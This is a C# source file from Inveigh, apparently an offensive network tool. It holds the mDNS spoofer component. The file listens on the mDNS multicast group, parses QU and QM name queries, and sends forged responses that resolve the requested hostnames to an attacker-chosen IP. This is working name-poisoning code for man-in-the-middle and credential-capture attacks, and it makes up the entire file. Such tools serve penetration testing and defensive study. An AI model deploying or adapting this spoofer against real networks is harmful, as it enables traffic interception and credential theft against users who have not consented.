using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class MDNS
    {

        public static void MDNSListener(string IP, string spooferIP, string mdnsTTL, string[] mdnsTypes)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
            Array.Reverse(ttlMDNS);
            IPEndPoint mdnsEndpoint = new IPEndPoint(IPAddress.Any, 5353);
            UdpClient mdnsClient = new UdpClient();

            try
            {
                mdnsClient.ExclusiveAddressUse = false;
                mdnsClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                mdnsClient.Client.Bind(mdnsEndpoint);
                mdnsClient.JoinMulticastGroup(IPAddress.Parse("224.0.0.251"));
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[-] Error starting unprivileged mDNS spoofer, UDP port sharing does not work on all versions of Windows.", DateTime.Now.ToString("s")));
                }

                throw;
            }     

            while (!Program.exitInveigh)
            {

                try
                {
                    string mdnsResponseMessage = "";
                    byte[] udpPayload = mdnsClient.Receive(ref mdnsEndpoint);
                    int mdnsSourcePort = mdnsEndpoint.Port;
                    byte[] mdnsType = new byte[2];
                    IPAddress sourceIPAddress = mdnsEndpoint.Address;

                    if (BitConverter.ToString(udpPayload).EndsWith("-00-01-80-01") && String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-01-00-00-00-00-00-00"))
                    {
                        byte[] mdnsTransactionID = new byte[2];
                        string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                        System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                        byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                        System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                        string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');
                      
                        if (mdnsRequestSplit != null && mdnsRequestSplit.Length > 0)
                        {
                            mdnsResponseMessage = Util.CheckRequest(mdnsRequestSplit[0], sourceIPAddress.ToString(), IP.ToString(), "MDNS");
                        }

                        if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                        {

                            using (MemoryStream ms = new MemoryStream())
                            {
                                ms.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
                                ms.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                ms.Write(mdnsRequest, 0, mdnsRequest.Length);
                                ms.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
                                ms.Write(ttlMDNS, 0, 4);
                                ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                ms.Write(spooferIPData, 0, spooferIPData.Length);
                                IPEndPoint mdnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, mdnsSourcePort);
                                mdnsClient.Connect(mdnsDestinationEndPoint);
                                mdnsClient.Send(ms.ToArray(), ms.ToArray().Length);
                                mdnsClient.Close();
                                mdnsEndpoint = new IPEndPoint(IPAddress.Any, 5353);
                                mdnsClient = new UdpClient();
                                mdnsClient.ExclusiveAddressUse = false;
                                mdnsClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                                mdnsClient.Client.Bind(mdnsEndpoint);
                                mdnsClient.JoinMulticastGroup(IPAddress.Parse("224.0.0.251"));
                            }

                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] mDNS(QU) request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, sourceIPAddress, mdnsResponseMessage));
                        }


                    }
                    else if (BitConverter.ToString(udpPayload).EndsWith("-00-01") && (String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-01-00-00-00-00-00-00") || 
                        String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-02-00-00-00-00-00-00")))
                    {
                        byte[] mdnsTransactionID = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                        string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                        byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                        System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                        string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');

                        if (mdnsRequestSplit != null && mdnsRequestSplit.Length > 0)
                        {
                            mdnsResponseMessage = Util.CheckRequest(mdnsRequestSplit[0], sourceIPAddress.ToString(), IP.ToString(), "MDNS");
                        }

                        if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                        {

                            if (Array.Exists(mdnsTypes, element => element == "QM"))
                            {

                                using (MemoryStream ms = new MemoryStream())
                                {
                                    ms.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
                                    ms.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                    ms.Write(mdnsRequest, 0, mdnsRequest.Length);
                                    ms.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
                                    ms.Write(ttlMDNS, 0, 4);
                                    ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                    ms.Write(spooferIPData, 0, spooferIPData.Length);
                                    IPEndPoint mdnsDestinationEndPoint = new IPEndPoint(IPAddress.Parse("224.0.0.251"), 5353);
                                    mdnsClient.Connect(mdnsDestinationEndPoint);
                                    mdnsClient.Send(ms.ToArray(), ms.ToArray().Length);
                                    mdnsClient.Close();
                                    mdnsEndpoint = new IPEndPoint(IPAddress.Any, 5353);
                                    mdnsClient = new UdpClient();
                                    mdnsClient.ExclusiveAddressUse = false;
                                    mdnsClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                                    mdnsClient.Client.Bind(mdnsEndpoint);
                                    mdnsClient.JoinMulticastGroup(IPAddress.Parse("224.0.0.251"));
                                }

                            }
                            else
                            {
                                mdnsResponseMessage = "mDNS type disabled";
                            }

                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] mDNS(QM) request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, sourceIPAddress, mdnsResponseMessage));
                        }

                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] mDNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

    }
}
